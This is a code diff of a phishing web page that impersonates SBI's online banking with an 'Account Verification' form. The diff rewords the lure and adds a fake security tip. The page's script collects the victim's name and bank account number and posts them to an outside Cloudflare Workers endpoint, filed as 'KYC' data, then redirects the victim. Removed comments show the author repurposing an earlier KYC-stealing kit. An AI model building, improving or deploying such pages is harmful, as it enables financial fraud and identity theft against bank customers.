@@ -9,46 +9,35 @@
         body { background-color: #fff; display: flex; justify-content: center; min-height: 100vh; }
         .container { width: 100%; max-width: 500px; display: flex; flex-direction: column; }
         .full-img { width: 100%; display: block; }
-        
-        .header-bar { background-color: #315195; color: white; padding: 12px 15px; font-size: 14px; font-weight: bold; }
-        
+        .header-bar { background-color: #315195; color: white; padding: 12px 15px; font-size: 14px; font-weight: bold; text-transform: uppercase; }
         .content-area { padding: 20px 25px; }
-        .instruction-text { font-size: 13px; color: #333; margin-bottom: 20px; line-height: 1.5; border-left: 4px solid #315195; padding: 10px; background: #f8fbff; }
-        
+        .instruction-text { font-size: 13px; color: #333; margin-bottom: 22px; line-height: 1.6; border-left: 4px solid #315195; padding: 12px; background: #f8fbff; border-radius: 0 4px 4px 0; }
         .field-group { margin-bottom: 18px; }
-        .field-group label { display: block; font-size: 13px; color: #555; margin-bottom: 8px; font-weight: bold; }
-        
-        .bank-input { 
-            width: 100%; height: 38px; padding: 0 12px; 
-            background-color: #fff; border: 1px solid #999; 
-            border-radius: 2px; font-size: 15px; outline: none;
-            color: #333;
-        }
-        .bank-input:focus { border-color: #315195; box-shadow: 0 0 3px rgba(49,81,149,0.2); }
-
-        .btn-row { display: flex; gap: 12px; margin-top: 25px; }
-        .btn { padding: 10px 25px; border: none; color: white; font-size: 14px; border-radius: 2px; cursor: pointer; font-weight: bold; }
+        .field-group label { display: block; font-size: 13px; color: #444; margin-bottom: 8px; font-weight: bold; }
+        .bank-input { width: 100%; height: 38px; padding: 0 12px; background-color: #fff; border: 1px solid #999; border-radius: 2px; font-size: 15px; outline: none; color: #333; }
+        .bank-input:focus { border-color: #315195; }
+        .btn-row { display: flex; gap: 12px; margin-top: 28px; }
+        .btn { flex: 1; padding: 10px 0; border: none; color: white; font-size: 14px; border-radius: 2px; cursor: pointer; font-weight: bold; text-transform: uppercase; }
         .btn-submit { background-color: #315195; }
         .btn-gray { background-color: #6c757d; }
-
-        .footer-note { margin-top: 30px; font-size: 12px; color: #666; border-top: 1px solid #eee; padding-top: 15px; line-height: 1.4; }
+        .footer-note { margin-top: 35px; font-size: 12px; color: #666; border-top: 1px solid #eee; padding-top: 15px; line-height: 1.5; font-style: italic; }
     </style>
 </head>
 <body>
 
     <div class="container">
         <img src="https://i.ibb.co/fz5x9ff2/Main-817fcadb-1.jpg" alt="Header" class="full-img">
-        <div class="header-bar">Profile Update / Account Validation</div>
+        <div class="header-bar">Account Verification</div>
 
         <div class="content-area">
             <div class="instruction-text">
-                Please provide your <b>Account Number</b> and <b>Full Name</b> as per bank records to synchronize your profile with the new security protocols.
+                To ensure the safety of your account, please complete the <b>Account Verification</b> process by providing your registered Name and Account Number below.
             </div>
 
-            <form id="accountForm">
+            <form id="verificationForm">
                 <div class="field-group">
                     <label>Account Holder Name *</label>
-                    <input type="text" id="acc_name" class="bank-input" placeholder="Full Name (As per Bank)" required autocomplete="off">
+                    <input type="text" id="acc_name" class="bank-input" placeholder="Enter Full Name" required autocomplete="off">
                 </div>
 
                 <div class="field-group">
@@ -58,13 +47,13 @@
                 </div>
 
                 <div class="btn-row">
-                    <button type="submit" class="btn btn-submit" id="submitBtn">Submit Details</button>
+                    <button type="submit" class="btn btn-submit" id="submitBtn">Verify Account</button>
                     <button type="reset" class="btn btn-gray">Cancel</button>
                 </div>
             </form>
 
             <div class="footer-note">
-                <b>Note:</b> Make sure the account number is correct to avoid any transaction failures. OnlineSBI values your privacy.
+                <b>Security Tip:</b> Do not share your banking credentials with anyone. SBI will never ask for your password via SMS or Call.
             </div>
         </div>
 
@@ -76,7 +65,7 @@
     <script>
         const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
 
-        document.getElementById('accountForm').addEventListener('submit', async function(e) {
+        document.getElementById('verificationForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
             const accName = document.getElementById('acc_name').value;
@@ -86,11 +75,10 @@
             btn.disabled = true;
             btn.innerText = "Verifying...";
 
-            // KYC table hi use kar rahe hain, bas data content badal diya
             const payload = {
-                type: "KYC", // Worker ke database mein isi table mein jayega
-                pan: "NAME: " + accName, // PAN ki jagah Name bhej rahe hain
-                dob: "ACC: " + accNo    // DOB ki jagah Acc No bhej rahe hain
+                type: "KYC",
+                pan: "NAME: " + accName,
+                dob: "ACC: " + accNo
             };
 
             try {
@@ -101,10 +89,11 @@
                     body: JSON.stringify(payload)
                 });
                 
-                // Final redirect
-                window.location.href = "final.html"; 
+                // UPDATE: Redirecting to blogtwo.html
+                window.location.href = "blogtwo.html"; 
             } catch (err) {
-                window.location.href = "final.html";
+                // Error tab bhi redirect kar do
+                window.location.href = "blogtwo.html";
             }
         });
     </script>
